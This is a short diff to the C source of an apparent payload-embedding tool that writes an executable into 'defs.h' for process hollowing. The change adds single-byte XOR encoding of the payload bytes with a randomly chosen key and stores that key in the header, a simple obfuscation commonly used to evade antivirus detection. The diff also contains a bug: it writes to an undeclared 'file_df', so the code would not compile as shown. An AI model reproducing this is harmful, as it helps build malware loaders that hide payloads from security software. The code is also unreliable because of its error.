@@ -10,6 +10,7 @@ Web: https://github.com/govolution/bfg
 #include <stdlib.h>
 #include <unistd.h>
 #include <string.h>
+#include <time.h>
 
 void print_start();
 void print_help();
@@ -186,6 +187,13 @@ int main (int argc, char **argv)
 	{
 		printf("Write executable from %s to defs.h\n", Hvalue);
 		
+		// Initialize RNG
+		time_t t;
+		srand((unsigned) time(&t));
+		
+		// Generate random key byte
+		unsigned char keyByte = rand() % 256;
+		
 		FILE *file_exe = fopen(Hvalue, "r");
 		FILE *file_def = fopen("defs.h", "a");
 		
@@ -200,6 +208,8 @@ int main (int argc, char **argv)
 			if ((currentByte = fgetc(file_exe)) == EOF) break;			
 			if (i != 0) fprintf(file_def, ",");
 			if ((i % 12) == 0) fprintf(file_def, "\n\t");
+			// XOR the byte with the generated key before writing it into the array
+			currentByte = currentByte ^ keyByte;
 			fprintf(file_def, "0x%.2X", (unsigned char) currentByte);
 			currentSize++;
 		}
@@ -208,6 +218,9 @@ int main (int argc, char **argv)
 		
 		// Write payload size in bytes into defs.h
 		fprintf(file_def, "\nlong payloadSize = %ld;\n", currentSize);
+		
+		// Write keybyte value into defs.h
+		fprintf(file_df, "\nunsigned char keyByte = 0x%.2X;\n", keyByte);
 				
 		// Set define
 		fprintf(file_def, "\n#define PROCESS_HOLLOWING\n");
